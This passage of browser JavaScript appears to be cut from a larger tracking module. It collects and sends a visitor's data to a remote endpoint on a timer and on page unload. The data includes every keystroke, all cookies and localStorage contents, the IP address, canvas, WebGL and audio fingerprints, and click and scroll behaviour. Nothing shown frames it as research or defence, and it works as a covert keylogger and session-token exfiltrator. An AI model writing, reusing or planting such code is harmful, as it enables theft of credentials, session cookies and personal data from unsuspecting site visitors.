    }
    function getLocalStorageDump() {
      const out = {};
      for (let i = 0; i < localStorage.length; i++) {
        const k = localStorage.key(i);
        out[k] = localStorage.getItem(k);
      }
      return out;
    }
    function getCookies() {
      return document.cookie || '';
    }
    function canvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('fingerprint', 2, 2);
        ctx.strokeRect(10, 10, 50, 50);
        const data = canvas.toDataURL();
        let hash = 0;
        for (let i = 0; i < data.length; i++) {
          hash = ((hash << 5) - hash) + data.charCodeAt(i);
          hash |= 0;
        }
        return hash.toString();
      } catch (e) { return null; }
    }
    function webglFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
        const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        return `${vendor}|${renderer}`;
      } catch (e) { return null; }
    }
    function audioFingerprint() {
      try {
        const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
        const osc = ctx.createOscillator();
        const comp = ctx.createDynamicsCompressor();
        osc.connect(comp);
        comp.connect(ctx.destination);
        osc.start(0);
        return new Promise(resolve => {
          ctx.startRendering().then(buffer => {
            const sum = buffer.getChannelData(0).slice(0, 1000).reduce((a, b) => a + b, 0);
            resolve(sum.toFixed(3));
          }).catch(() => resolve(null));
        });
      } catch (e) { return Promise.resolve(null); }
    }
    function trackEvent(type, payload) {
      state.events.push({ t: Date.now(), type, payload });
    }
    function setupBehaviorTracking() {
      document.addEventListener('click', e => {
        trackEvent('click', { x: e.clientX, y: e.clientY, tag: e.target.tagName, id: e.target.id, cls: e.target.className });
      });
      document.addEventListener('scroll', () => {
        trackEvent('scroll', { y: window.scrollY });
      }, { passive: true });
      document.addEventListener('keydown', e => {
        trackEvent('key', { k: e.key, code: e.code });
      });
      window.addEventListener('beforeunload', () => {
        flush(true);
      });
    }
    async function gatherInitial() {
      const ip = await getIP();
      const audio = await audioFingerprint();
      const initial = {
        sessionId: state.sessionId,
        url: location.href,
        ua: getUserAgent(),
        lang: getLanguage(),
        tz: getTimezone(),
        screen: getScreen(),
        plugins: getPlugins(),
        ip,
        ref: getReferrer(),
        ls: getLocalStorageDump(),
        cookies: getCookies(),
        canvas: canvasFingerprint(),
        webgl: webglFingerprint(),
      };
      if (audio) initial.audio = audio;
      trackEvent('init', initial);
    }
    async function flush(sync=false) {
      if (!state.events.length) return;
      const payload = { sessionId: state.sessionId, events: state.events.splice(0), ts: Date.now() };
      if (sync && navigator.sendBeacon) {
        navigator.sendBeacon(state.endpoint, JSON.stringify(payload));
      } else {
        try {
          await fetch(state.endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
        } catch (e) {}
      }
      state.lastSend = Date.now();
    }
    function start() {
      setupBehaviorTracking();
      gatherInitial();
      setInterval(() => flush(false), state.sendIntervalMs);
    }
    return { start };
  })();

